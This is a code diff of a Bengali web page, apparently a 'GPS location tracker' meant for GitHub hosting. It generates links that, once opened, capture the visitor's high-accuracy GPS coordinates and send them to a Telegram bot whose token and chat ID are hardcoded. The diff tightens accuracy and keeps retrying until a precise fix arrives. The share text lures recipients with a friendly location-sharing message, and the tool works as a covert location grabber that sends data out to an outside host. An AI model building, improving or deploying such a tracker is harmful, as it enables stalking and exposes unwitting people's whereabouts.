@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>লোকেশন শেয়ারার টুল</title>
+    <title>GPS লোকেশন ট্র্যাকার</title>
     <style>
         * {
             margin: 0;
@@ -13,7 +13,7 @@
         }
         
         body {
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             color: #333;
             min-height: 100vh;
             padding: 20px;
@@ -25,7 +25,7 @@
         .container {
             background-color: white;
             border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             width: 100%;
             max-width: 800px;
             overflow: hidden;
@@ -207,12 +207,71 @@
             color: white;
         }
         
+        .location-info {
+            background-color: #f0f9ff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            display: none;
+        }
+        
+        .location-info h3 {
+            color: #0369a1;
+            margin-bottom: 10px;
+        }
+        
+        .location-details {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        
+        .detail-item {
+            background: white;
+            padding: 10px;
+            border-radius: 6px;
+            border-left: 3px solid #4A6CF7;
+        }
+        
+        .detail-label {
+            font-size: 12px;
+            color: #6b7280;
+        }
+        
+        .detail-value {
+            font-weight: 600;
+            color: #1f2937;
+        }
+        
+        .gps-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #059669;
+        }
+        
+        .gps-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #10B981;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        
         footer {
             text-align: center;
             padding: 20px;
             color: #6b7280;
             font-size: 14px;
             border-top: 1px solid #e5e7eb;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
         }
         
         @media (max-width: 600px) {
@@ -233,14 +292,18 @@
             .share-buttons {
                 flex-direction: column;
             }
+            
+            .location-details {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>লোকেশন শেয়ারার টুল</h1>
-            <p class="subtitle">একটি শেয়ারযোগ্য লিঙ্ক তৈরি করুন যা লোকেশন শেয়ার করবে</p>
+            <h1>GPS লোকেশন ট্র্যাকার</h1>
+            <p class="subtitle">হাই-একুরেসি GPS লোকেশন ট্র্যাকিং</p>
         </header>
         
         <div class="content">
@@ -274,6 +337,32 @@
                 </div>
             </div>
             
+            <div class="location-info" id="locationInfo">
+                <h3>লোকেশন ডিটেইলস:</h3>
+                <div class="location-details">
+                    <div class="detail-item">
+                        <div class="detail-label">অক্ষাংশ (Latitude)</div>
+                        <div class="detail-value" id="latitudeValue">-</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">দ্রাঘিমাংশ (Longitude)</div>
+                        <div class="detail-value" id="longitudeValue">-</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">সঠিকতা</div>
+                        <div class="detail-value" id="accuracyValue">-</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">উচ্চতা</div>
+                        <div class="detail-value" id="altitudeValue">-</div>
+                    </div>
+                </div>
+                <div class="gps-indicator">
+                    <div class="gps-dot"></div>
+                    <span>GPS সিগন্যাল সক্রিয়</span>
+                </div>
+            </div>
+            
             <div class="status" id="statusMessage"></div>
             
             <div class="instructions">
@@ -282,13 +371,14 @@
                     <li>আপনার নাম লিখুন (ঐচ্ছিক)</li>
                     <li>"শেয়ারযোগ্য লিঙ্ক তৈরি করুন" বাটনে ক্লিক করুন</li>
                     <li>প্রাপ্ত লিঙ্কটি কপি করুন এবং শেয়ার করুন</li>
-                    <li>যখন কেউ এই লিঙ্কটি ওপেন করবে, তার লোকেশন স্বয়ংক্রিয়ভাবে টেলিগ্রাম বটে পাঠানো হবে</li>
+                    <li>যখন কেউ এই লিঙ্কটি ওপেন করবে, তার GPS লোকেশন স্বয়ংক্রিয়ভাবে টেলিগ্রাম বটে পাঠানো হবে</li>
+                    <li><strong>দ্রষ্টব্য:</strong> সঠিক লোকেশনের জন্য GPS চালু রাখুন এবং আউটডোরে থাকুন</li>
                 </ol>
             </div>
         </div>
         
         <footer>
-            <p>এই টুলটি GitHub-এ হোস্ট করার জন্য তৈরি করা হয়েছে</p>
+            <p>এই টুলটি GitHub-এ হোস্ট করার জন্য তৈরি করা হয়েছে | GPS ব্যবহার করে হাই-একুরেসি লোকেশন ট্র্যাকিং</p>
         </footer>
     </div>
 
@@ -306,6 +396,11 @@
             const whatsappShare = document.getElementById('whatsappShare');
             const facebookShare = document.getElementById('facebookShare');
             const telegramShare = document.getElementById('telegramShare');
+            const locationInfo = document.getElementById('locationInfo');
+            const latitudeValue = document.getElementById('latitudeValue');
+            const longitudeValue = document.getElementById('longitudeValue');
+            const accuracyValue = document.getElementById('accuracyValue');
+            const altitudeValue = document.getElementById('altitudeValue');
             
             // URL প্যারামিটার চেক করুন
             const urlParams = new URLSearchParams(window.location.search);
@@ -334,10 +429,10 @@
                 linkContainer.style.display = 'block';
                 
                 // শেয়ার লিঙ্ক সেট আপ করুন
-                const shareText = `${userName} আপনার লোকেশন শেয়ার করতে চান: ${trackingLink}`;
+                const shareText = `${userName} আপনার GPS লোকেশন শেয়ার করতে চান: ${trackingLink}`;
                 whatsappShare.href = `https://wa.me/?text=${encodeURIComponent(shareText)}`;
                 facebookShare.href = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(trackingLink)}`;
-                telegramShare.href = `https://t.me/share/url?url=${encodeURIComponent(trackingLink)}&text=${encodeURIComponent(userName + ' আপনার লোকেশন শেয়ার করতে চান')}`;
+                telegramShare.href = `https://t.me/share/url?url=${encodeURIComponent(trackingLink)}&text=${encodeURIComponent(userName + ' আপনার GPS লোকেশন শেয়ার করতে চান')}`;
                 
                 showStatus('লিঙ্ক তৈরি হয়েছে! এখন এটি শেয়ার করুন।', 'success');
             });
@@ -349,74 +444,126 @@
                 showStatus('লিঙ্ক কপি হয়েছে!', 'success');
             });
             
-            // লোকেশন শেয়ার ফাংশন
+            // GPS লোকেশন শেয়ার ফাংশন
             function shareLocation(userName) {
                 if (!navigator.geolocation) {
-                    showStatus('আপনার ব্রাউজার লোকেশন সাপোর্ট করে না।', 'error');
+                    showStatus('আপনার ব্রাউজার GPS লোকেশন সাপোর্ট করে না।', 'error');
                     return;
                 }
                 
-                showStatus('লোকেশন শেয়ার করা হচ্ছে...', 'info');
+                showStatus('GPS লোকেশন শনাক্ত করা হচ্ছে...', 'info');
+                locationInfo.style.display = 'block';
+                
+                // GPS অপশনস - হাই একুরেসির জন্য
+                const options = {
+                    enableHighAccuracy: true,  // GPS ব্যবহার করতে বলুন
+                    timeout: 30000,           // 30 সেকেন্ড পর্যন্ত অপেক্ষা করুন
+                    maximumAge: 0             // ক্যাশ করা লোকেশন নেবেন না
+                };
                 
                 // লোকেশন অনুমতি চাওয়া
-                navigator.geolocation.getCurrentPosition(
+                const watchId = navigator.geolocation.watchPosition(
                     // সফল হলে
                     function(position) {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
+                        const altitude = position.coords.altitude;
                         
-                        showStatus('লোকেশন পাওয়া গেছে! টেলিগ্রামে পাঠানো হচ্ছে...', 'info');
+                        // লোকেশন ডিটেইলস আপডেট করুন
+                        latitudeValue.textContent = latitude.toFixed(6);
+                        longitudeValue.textContent = longitude.toFixed(6);
+                        accuracyValue.textContent = `${accuracy.toFixed(1)} মিটার`;
+                        altitudeValue.textContent = altitude ? `${altitude.toFixed(1)} মিটার` : 'উপলব্ধ নয়';
                         
-                        // লোকেশন ডাটা টেলিগ্রামে পাঠানো
-                        sendToTelegram(latitude, longitude, accuracy, userName);
+                        // একুরেসি চেক করুন
+                        if (accuracy <= 50) { // 50 মিটারের মধ্যে হলে ভালো
+                            showStatus(`হাই-একুরেসি GPS লোকেশন পাওয়া গেছে! (${accuracy.toFixed(1)} মিটার)`, 'success');
+                            
+                            // লোকেশন ডাটা টেলিগ্রামে পাঠানো
+                            sendToTelegram(latitude, longitude, accuracy, altitude, userName);
+                            
+                            // লোকেশন ট্র্যাকিং বন্ধ করুন
+                            navigator.geolocation.clearWatch(watchId);
+                            
+                            // ৩ সেকেন্ড পর হোমপেজে রিডাইরেক্ট
+                            setTimeout(() => {
+                                window.location.href = window.location.href.split('?')[0];
+                            }, 3000);
+                        } else {
+                            showStatus(`GPS লোকেশন পাওয়া গেছে, কিন্তু একুরেসি কম (${accuracy.toFixed(1)} মিটার)। আরো ভালো সিগন্যালের জন্য অপেক্ষা করছি...`, 'info');
+                        }
                     },
                     // ব্যর্থ হলে
                     function(error) {
-                        let errorMessage = 'লোকেশন পাওয়া যায়নি। ';
+                        let errorMessage = 'GPS লোকেশন পাওয়া যায়নি। ';
                         
                         switch(error.code) {
                             case error.PERMISSION_DENIED:
-                                errorMessage += 'আপনি লোকেশন এক্সেসের অনুমতি দেননি।';
+                                errorMessage += 'আপনি GPS লোকেশন এক্সেসের অনুমতি দেননি।';
                                 break;
                             case error.POSITION_UNAVAILABLE:
-                                errorMessage += 'লোকেশন ইনফরমেশন অনুপলব্ধ।';
+                                errorMessage += 'GPS লোকেশন ইনফরমেশন অনুপলব্ধ। আউটডোরে যান বা GPS চালু করুন।';
                                 break;
                             case error.TIMEOUT:
-                                errorMessage += 'লোকেশন রিকোয়েস্ট টাইমআউট হয়েছে।';
+                                errorMessage += 'GPS লোকেশন রিকোয়েস্ট টাইমআউট হয়েছে। আউটডোরে যান বা GPS চালু করুন।';
                                 break;
                             default:
                                 errorMessage += 'একটি অজানা ত্রুটি ঘটেছে।';
                         }
                         
                         showStatus(errorMessage, 'error');
+                        locationInfo.style.display = 'none';
                     },
-                    // অপশনস
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
+                    options
                 );
+                
+                // 30 সেকেন্ড পরেও যদি ভালো একুরেসি না পাওয়া যায়
+                setTimeout(() => {
+                    navigator.geolocation.clearWatch(watchId);
+                    showStatus('সময় শেষ! বর্তমান লোকেশন পাঠানো হচ্ছে...', 'info');
+                    
+                    // শেষ অবস্থানের লোকেশন নিন
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            const accuracy = position.coords.accuracy;
+                            const altitude = position.coords.altitude;
+                            
+                            sendToTelegram(latitude, longitude, accuracy, altitude, userName);
+                            
+                            setTimeout(() => {
+                                window.location.href = window.location.href.split('?')[0];
+                            }, 3000);
+                        },
+                        function(error) {
+                            showStatus('লোকেশন পাঠানো সম্ভব হয়নি।', 'error');
+                        },
+                        { enableHighAccuracy: false, timeout: 10000 }
+                    );
+                }, 30000);
             }
             
             // টেলিগ্রামে ডাটা পাঠানোর ফাংশন
-            function sendToTelegram(latitude, longitude, accuracy, userName) {
+            function sendToTelegram(latitude, longitude, accuracy, altitude, userName) {
                 // এখানে আপনার টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি দিন
                 const TELEGRAM_BOT_TOKEN = "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk";
                 const TELEGRAM_CHAT_ID = "2139008203";
                 
                 // Google Maps লিংক তৈরি
                 const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                const mapsLink = `[Google Maps এ দেখুন](${mapsUrl})`;
                 
                 // মেসেজ তৈরি
-                const message = `📍 নতুন লোকেশন রিপোর্ট!\n\n` +
-                               `ব্যবহারকারী: ${userName}\n` +
-                               `অক্ষাংশ: ${latitude}\n` +
-                               `দ্রাঘিমাংশ: ${longitude}\n` +
-                               `সঠিকতা: ${accuracy} মিটার\n\n` +
-                               `Google Maps: ${mapsUrl}\n\n` +
-                               `সময়: ${new Date().toLocaleString('bn-BD')}`;
+                const message = `📍 **GPS লোকেশন রিপোর্ট!** 📍\n\n` +
+                               `**ব্যবহারকারী:** ${userName}\n` +
+                               `**অক্ষাংশ:** ${latitude.toFixed(6)}\n` +
+                               `**দ্রাঘিমাংশ:** ${longitude.toFixed(6)}\n` +
+                               `**সঠিকতা:** ${accuracy.toFixed(1)} মিটার\n` +
+                               `**উচ্চতা:** ${altitude ? `${altitude.toFixed(1)} মিটার` : 'উপলব্ধ নয়'}\n\n` +
+                               `${mapsLink}\n\n` +
+                               `**সময়:** ${new Date().toLocaleString('bn-BD')}`;
                 
                 // টেলিগ্রাম API-তে রিকোয়েস্ট পাঠানো
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -426,18 +573,14 @@
                     },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: message
+                        text: message,
+                        parse_mode: 'Markdown'
                     })
                 })
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        showStatus('লোকেশন সফলভাবে টেলিগ্রামে পাঠানো হয়েছে!', 'success');
-                        
-                        // ৩ সেকেন্ড পর হোমপেজে রিডাইরেক্ট
-                        setTimeout(() => {
-                            window.location.href = window.location.href.split('?')[0];
-                        }, 3000);
+                        showStatus('GPS লোকেশন সফলভাবে টেলিগ্রামে পাঠানো হয়েছে!', 'success');
                     } else {
                         showStatus('টেলিগ্রামে পাঠাতে সমস্যা হয়েছে।', 'error');
                     }
